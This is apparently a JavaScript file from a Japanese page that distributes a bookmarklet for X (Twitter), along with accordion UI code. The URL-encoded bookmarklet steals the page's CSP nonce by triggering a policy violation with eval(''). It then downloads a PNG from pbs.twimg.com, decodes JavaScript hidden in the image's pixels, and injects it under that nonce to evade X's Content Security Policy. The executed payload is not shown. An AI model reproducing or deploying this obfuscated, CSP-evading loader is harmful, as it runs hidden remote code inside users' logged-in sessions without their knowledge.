let code = "javascript:'use%20strict'%3Bif(%22x.com%22!%3Dwindow.location.host)alert(%22Twitter(X)%5Cu3092%5Cu958b%5Cu3044%5Cu305f%5Cu72b6%5Cu614b%5Cu3067%5Cu5b9f%5Cu884c%5Cu3057%5Cu3066%5Cu304f%5Cu3060%5Cu3055%5Cu3044%22)%3Belse%7Bfunction%20p(e)%7Bdocument.removeEventListener(%22securitypolicyviolation%22%2Cp)%3Be%3De.originalPolicy.split(%22'%22)%3Bfor(let%20b%3D0%3Bb%3Ce.length%3Bb%2B%2B)e%5Bb%5D.includes(%22nonce%22)%26%26(window.nonce%3De%5Bb%5D.slice(6))%3Bvar%20h%3Ddocument.createElement(%22div%22)%3Bh.innerText%3D%22%5Cu8d77%5Cu52d5%5Cu4e2d%22%3Bh.style.cssText%3D%22z-index%3A99999%3B%20width%3A80%25%3B%20height%3A80px%3B%20position%3Afixed%3B%20background-color%3A%23fbf7f7%3B%20color%3A%23000%3B%20inset%3A%200%3B%20margin%3A%20auto%3B%20text-align%3Acenter%3B%22%3Bdocument.body.appendChild(h)%3Bvar%20d%3Dnew%20XMLHttpRequest%3Bd.open(%22get%22%2C%22https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FGNwsHrmbgAEuylL.png%22)%3Bd.responseType%3D%22blob%22%3Bd.send()%3Bd.onreadystatechange%3Dfunction()%7Bif(4%3D%3D%3Dd.readyState%26%26200%3D%3D%3Dd.status)%7Blet%20b%3Ddocument.createElement(%22canvas%22)%2Cf%3Dnew%20Image%3Bf.src%3DURL.createObjectURL(this.response)%3Bf.onload%3D()%3D%3E%7Bvar%20c%3Db.getContext(%222d%22%2C%7BwillReadFrequently%3A!0%7D)%3Blet%20g%3Df.width%2Cl%3Df.height%3Bvar%20a%3D%5B%5D%3Blet%20q%3D!1%2Cr%3D%22%22%3Bb.setAttribute(%22width%22%2Cg)%3Bb.setAttribute(%22height%22%2Cl)%3Bc.drawImage(f%2C0%2C0%2Cg%2Cl)%3Ba%3Afor(let%20k%3D0%3Bk%3Cg*l%3Bk%2B%2B)%7Blet%20t%3Dc.getImageData(Math.floor(k%2Fg)%2Ck%25g%2C1%2C1)%3Bfor(let%20m%3D0%3B3%3Em%3Bm%2B%2B)%7Blet%20n%3Dt.data%5Bm%5D%3Bif(q%26%26255%3D%3Dn)break%20a%3Ba.push(n)%3Bq%3D255%3D%3Dn%7D%7Dfor(c%3D0%3Bc%3C(a.length-1)%2F2%3Bc%2B%2B)r%2B%3DString.fromCharCode(256*a%5B2*c%5D%2Ba%5B2*c%2B1%5D)%3Ba%3Ddocument.createElement(%22script%22)%3Ba.src%3D%22data%3Atext%2Fjavascript%3Bbase64%2C%22%2Bbtoa(unescape(encodeURIComponent(r)))%3Ba.onload%3D()%3D%3E%7Bh.remove()%3Binit()%7D%3Ba.nonce%3Dwindow.nonce%3Bdocument.body.appendChild(a)%7D%7D%7D%7Ddocument.addEventListener(%22securitypolicyviolation%22%2Cp)%3Beval(%22%22)%7D%3Bvoid+0";

document.addEventListener("DOMContentLoaded", () => {
    setUpAccordion();
    document.getElementsByClassName("let")[0].setAttribute('href', code);
    document.getElementsByClassName("let")[2].setAttribute('href', code);
    const button = document.getElementsByClassName("let")[1];
    button.addEventListener('click', () => {
        if (!navigator.clipboard) {
            alert("このブラウザは対応していません");
            return;
        }
        navigator.clipboard.writeText(code).then(
            () => {
                alert('コードをコピーしました。');
            },
            () => {
                alert('コピーに失敗しました。');
            });
    });
});

const setUpAccordion = () => {
    const details = document.querySelectorAll(".js-details");
    const IS_OPENED_CLASS = "is-opened";

    details.forEach((element) => {
        const summary = element.querySelector(".js-summary");
        const content = element.querySelector(".js-content");

        summary.addEventListener("click", (event) => {
            event.preventDefault();
            if (element.classList.contains(IS_OPENED_CLASS)) {
                element.classList.toggle(IS_OPENED_CLASS);
                closingAnim(content, element).restart();
            } else {
                element.classList.toggle(IS_OPENED_CLASS);
                element.setAttribute("open", "true");
                openingAnim(content).restart();
            }
        });
    });
}

const closingAnim = (content, element) => gsap.to(content, {
    height: 0,
    opacity: 0,
    duration: 0.4,
    ease: "power3.out",
    overwrite: true,
    onComplete: () => {
        element.removeAttribute("open");
    },
});

const openingAnim = (content) => gsap.fromTo(
    content, {
        height: 0,
        opacity: 0,
    }, {
        height: "auto",
        opacity: 1,
        duration: 0.4,
        ease: "power3.out",
        overwrite: true,
    });
